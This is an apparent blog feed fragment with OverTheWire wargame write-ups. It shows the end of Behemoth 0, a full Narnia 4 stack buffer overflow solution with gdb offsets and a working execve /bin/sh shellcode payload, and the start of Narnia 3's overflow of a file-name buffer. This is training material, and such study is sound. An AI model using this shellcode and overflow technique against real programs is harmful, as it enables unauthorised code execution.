0xffffd650:	&lt;span class=&quot;s2&quot;&gt;&quot;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Fw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53eatmyshorts&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This string at the end looks quite suspicious, maybe we should check that? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth0@melinda:/behemoth$ &lt;/span&gt;./behemoth0
Password: eatmyshorts
Access granted..
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat /etc/behemoth_pass/behemoth1
&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It was the password! &lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I'm definitely going to continue Behemoth wargame, as from the beginning challenges are really fun and intriguing. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 4 -&amp;gt; 5</title><link href="http://localhost:4000/overthewire.org-narnia-5/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 4 -&gt; 5" /><published>2017-03-09T00:00:00+00:00</published><updated>2017-03-09T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-5</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-5/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Today we'll be dealing with another reverse engineering challenge from Overthewire - pretty quick, but fun as always!  &lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;This code is a lot shorter, compared to the previous ones, making it much easier to analyze. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yeah, we have a buffer of 256 bytes, which gets the content, using dangerous &lt;b&gt;strcpy&lt;/b&gt; function straight from the argument variable. This challenge looks a lot like the second one, so maybe we will also be able to put shellcode somewhere in the buffer? &lt;/p&gt;

&lt;p&gt;Actually, after a little bit of tinktering in &lt;b&gt;gdb&lt;/b&gt;, I've found that providing the binary with 273 &quot;A&quot; letters and 7 &quot;B&quot; letters will overwrite our buffer, together with return address.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 272 + &quot;BBBBBBB&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
The program being debugged has been started already.
Start it from the beginning? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y or n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y

Starting program: /games/narnia/narnia4 &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 272 + &quot;BBBBBBB&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;

Program received signal SIGSEGV, Segmentation fault.
0x42424242 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's take a look at the memory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x41414141  0x41414141  0x42424141  0x42424242
0xffffd8c0: 0x00004242  0x00000000  0x00000000  0x00000000
0xffffd8d0: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd8e0: 0x00000000  0x00000000  0x00000000  0x00000000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From this we know that we have somewhere around 272 bytes for the shellcode with some additional bytes that will overwrite the return address. Now we can construct the command, using code from the previous levels. &lt;/p&gt;

&lt;p&gt;As we already know that our payload is 25 bytes in size, we will have to: firstly write 247 &quot;A&quot; letters, then 25 bytes of shellcode and lastly overwriting the &lt;b&gt;EIP register&lt;/b&gt;, which then will be placed somewhere in the middle of &quot;A&quot; letters. By looking at the debug of the memory, I'm going to choose it as &lt;b&gt;0xffffd850&lt;/b&gt;.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia4@melinda:/narnia$ &lt;/span&gt;./narnia4 &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c&lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 247 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; + &quot;\x50\xd8\xff\xff&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat /etc/narnia_pass/narnia5
&lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once again we have the password to the next level! &lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Another big thanks to &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;! I'm looking forward to the next challenges! &lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 3 -&amp;gt; 4</title><link href="http://localhost:4000/overthewire.org-narnia-4/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 3 -&gt; 4" /><published>2017-03-05T00:00:00+00:00</published><updated>2017-03-05T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-4</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-4/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let's go back to another reverse engineering challenge from OverTheWire. Today we'll be dealing with a little different type of buffer overflow.  &lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;This time, we can start by firstly running the program. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But what can we see in the source code? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ifd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ofd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ifile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;usage, %s file, will send contents of file 2 /dev/null&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* open files */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;error opening %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;error opening %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ifile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* copy from file1 to file2 */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;copied contents of %s to a safer place... (%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* close 'em */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This code may look complicated at first. But, after taking a closer look, we can see a potential buffer overflow vulnerability in &lt;b&gt;ifile&lt;/b&gt; buffer, which is 32 bytes in size. &lt;/p&gt;

&lt;p&gt;Because &lt;b&gt;strcpy()&lt;/b&gt; does not perform any checks of the length of the input, if I give a file name longer than 32 bytes in length, I would be able to overwrite the &lt;b&gt;ofile&lt;/b&gt; from &lt;b&gt;/dev/null&lt;/b&gt; to another file. &lt;/p&gt;

&lt;p&gt;It's known bug in the strcpy man pages: &lt;/p&gt;

&lt;p&gt;&lt;i&gt;If the destination string of a strcpy() is not large enough, then  anything  might  happen.   Overflowing  fixed-length  string  buffers is a favorite cracker technique for taking complete control of the  machine. Any  time  a  program  reads  or copies data into a buffer, the program first needs to check that there's enough space.  This may  be  unnecessary  if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make  the  impossible possible.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Firstly, I'm going to create a file in &lt;b&gt;/tmp&lt;/b&gt; directory, where possibly, the password for the next level will end up.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia3@melinda:~$ cd /tmp
narnia3@melinda:/tmp$ touch w3ndige&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Then, I'm going to use Python and calculate how long the directory should be, together with &lt;b&gt;/tmp/&lt;/b&gt; beggining. We can also generate letters for our directory name. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;
